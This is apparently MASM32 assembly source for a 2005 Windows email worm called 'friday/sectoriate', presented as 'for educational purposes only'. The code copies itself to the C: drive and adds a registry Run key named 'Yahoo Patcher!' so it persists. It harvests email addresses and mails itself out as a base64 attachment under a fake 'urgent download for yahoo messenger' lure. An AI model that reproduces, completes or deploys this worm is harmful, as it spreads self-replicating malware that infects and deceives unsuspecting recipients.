;/////////////////////////////////// friday sectoriate ///////////////////////////////
;
;
;
;
;                        dont ask further questions but you can email ur 
;                        damns, criticisms,and of course ur gf booby pic
;                              fakedminded[at]coolgoose[point]com
;                               
;////////////////////////////////////////////////////////////////////////////////////

.586
.model flat,stdcall
option casemap:none




includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\wsock32.lib
includelib \masm32\lib\advapi32.lib
;includelib \masm32\lib\shlwapi.lib

includelib \masm32\lib\wininet.lib

include  \masm32\include\windows.inc
include \masm32\include\user32.inc
include \masm32\include\kernel32.inc
include \masm32\include\wsock32.inc
include \masm32\include\advapi32.inc

include \masm32\include\wininet.inc
include base64.asm

worm_size = 8704 ;change it according your assembled exe file size

.data?
bwr dd ?
email_address db 256 dup(?)
host_name db 256 dup(?)

worm_file db 256 dup(?)

hres dd ?
ressize dd ?
resmem dd ?

bufferthis2 db 512 dup(?)

.data
signature db "friday version 1.0 Beta",13,10 ,\
             "Created By fakedminded in 2005",13,10, \
             "for educational purposes only! ",0
            

To db 'To: "',0
separator db "----=_NextPart_000_000A_01C4FC66.D7DF5CE0",0

Quote db '"',0
space db " ",0
crlf db 13,10,0

subject db "Subject: Important",13,10,0
Mailmsg db "urgent download for yahoo messenger!!",0

start_key    db     'Yahoo Patcher!', 0
run_services db     'software\Microsoft\Windows\CurrentVersion\Run',0

from db 'From: "',0
net_flag dd 0

root_file db "c:\sectoriate.exe",0



.code 

include base64encoder.asm

include find_email.asm
include host.asm

include send.asm

start:


.code

invoke DeleteFile,offset root_file
invoke GetModuleFileName,0,offset worm_file,256

invoke CopyFile,offset worm_file,offset root_file,FALSE

call base64encoder




invoke RegOpenKeyEx,HKEY_CURRENT_USER,offset run_services,0,KEY_ALL_ACCESS,offset reg_handle
cmp eax,0
jne exit_finish
mov sz_buffer_keyname_e_e,sizeof root_file
invoke RegSetValueEx,reg_handle,addr start_key,0,REG_SZ,offset root_file,  sz_buffer_keyname_e_e
invoke RegCloseKey,reg_handle
invoke FindResource,0,1111,RT_RCDATA
mov hres,eax
cmp eax,0
je exit_finish
invoke LoadResource,0,hres
or eax,eax
jz exit_finish

mov resmem,eax
invoke SizeofResource,0,hres
or eax,eax
jz exit_finish
mov ressize ,eax


call EnableArchive
call find_email
call find_host  ;for future versions
invoke lstrcpy,offset host_name,eax

wait_for_connection:
invoke Sleep,10000
invoke InternetGetConnectedState,offset net_flag,0
cmp eax,1
jne wait_for_connection


Again:
invoke lstrcat,offset bufferthis2,offset from
invoke lstrcat,offset bufferthis2,offset mailfrom
invoke lstrcat,offset bufferthis2,offset extend3
invoke lstrcat,offset bufferthis2,offset Quote
invoke lstrcat,offset bufferthis2,offset crlf

invoke lstrcat,offset bufferthis2,offset To
invoke lstrcat,offset bufferthis2,offset email_buffer
invoke lstrcat,offset bufferthis2,offset extend3
invoke lstrcat,offset bufferthis2,offset Quote
invoke lstrcat,offset bufferthis2,offset crlf
invoke lstrcat,offset bufferthis2,offset subject

call Intiate_Mail
;cmp eax,1
;je wait_for_connection

call c_send

invoke RtlZeroMemory,offset bufferthis2,512

call gimbo
cmp eax,1
je exit_finish

;jmp Again

jmp wait_for_connection

invoke ExitProcess,0

exit_finish:
.data
errfin db "error in finishing part",0
.code
;invoke MessageBox,0,offset errfin,offset errfin,0 ;once used for debugging
invoke GlobalFree,ultmem

invoke ExitProcess,0
end start

